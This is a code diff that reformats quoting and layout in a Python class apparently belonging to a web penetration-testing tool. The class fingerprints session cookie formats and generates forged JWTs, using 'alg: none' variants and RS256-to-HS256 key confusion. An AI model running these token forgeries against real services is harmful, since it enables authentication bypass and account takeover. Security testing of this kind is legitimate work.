@@ -30,7 +30,7 @@ class SessionIntelligence:
         "flask": re.compile(r"eyJ(?:[\w-]*\.)(?:[\w-]*\.)[\w-]*"),
         "django": re.compile(r"^[\.a-zA-z-0-9]+:[\.a-zA-z-0-9:]+$"),
         "jwt": re.compile(r"^ey[A-Za-z0-9-_=]+\.ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]*$"),
-        "aspnet_viewstate": re.compile(r"^/wEP[A-Za-z0-9+/=]+$")
+        "aspnet_viewstate": re.compile(r"^/wEP[A-Za-z0-9+/=]+$"),
     }
 
     @classmethod
@@ -47,7 +47,7 @@ class SessionIntelligence:
         Generates JWT algorithm confusion and 'none' attack tokens.
         Ported from 0xSojalSec-Confusional.
         """
-        parts = token.split('.')
+        parts = token.split(".")
         if len(parts) != 3:
             return []
 
@@ -55,7 +55,7 @@ class SessionIntelligence:
         try:
             # Handle padding
             def b64_decode(s):
-                return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4))
+                return base64.urlsafe_b64decode(s + "=" * (4 - len(s) % 4))
 
             header_json = json.loads(b64_decode(header_b64).decode())
             _ = header_json  # Mark as used via variable
@@ -65,13 +65,9 @@ class SessionIntelligence:
         attacks = []
 
         # 1. Algorithm 'none'
-        none_headers = [
-            {"alg": "none", "typ": "JWT"},
-            {"alg": "None", "typ": "JWT"},
-            {"alg": "nOnE", "typ": "JWT"}
-        ]
+        none_headers = [{"alg": "none", "typ": "JWT"}, {"alg": "None", "typ": "JWT"}, {"alg": "nOnE", "typ": "JWT"}]
         for nh in none_headers:
-            h_b64 = base64.urlsafe_b64encode(json.dumps(nh).encode()).decode().rstrip('=')
+            h_b64 = base64.urlsafe_b64encode(json.dumps(nh).encode()).decode().rstrip("=")
             attacks.append(f"{h_b64}.{payload_b64}.")
 
         # 2. RS256 to HS256 Confusion
@@ -79,11 +75,11 @@ class SessionIntelligence:
             # If we have the public key, we use it as the HMAC secret
             secret = public_key.encode()
             hs_header = {"alg": "HS256", "typ": "JWT"}
-            h_b64 = base64.urlsafe_b64encode(json.dumps(hs_header).encode()).decode().rstrip('=')
+            h_b64 = base64.urlsafe_b64encode(json.dumps(hs_header).encode()).decode().rstrip("=")
 
             signing_input = f"{h_b64}.{payload_b64}".encode()
             sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
-            sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
+            sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip("=")
             attacks.append(f"{h_b64}.{payload_b64}.{sig_b64}")
 
         return attacks
@@ -94,11 +90,11 @@ class SessionIntelligence:
         try:
             # Flask cookies are serialized with itsdangerous (base64 of json)
             # Format: .[base64_payload].[sig] or [base64_payload].[sig]
-            parts = cookie.split('.')
-            payload = parts[0] if not cookie.startswith('.') else parts[1]
+            parts = cookie.split(".")
+            payload = parts[0] if not cookie.startswith(".") else parts[1]
 
             # Add padding
-            payload += '=' * (4 - len(payload) % 4)
+            payload += "=" * (4 - len(payload) % 4)
             decoded = base64.urlsafe_b64decode(payload)
             return json.loads(decoded)
         except Exception:
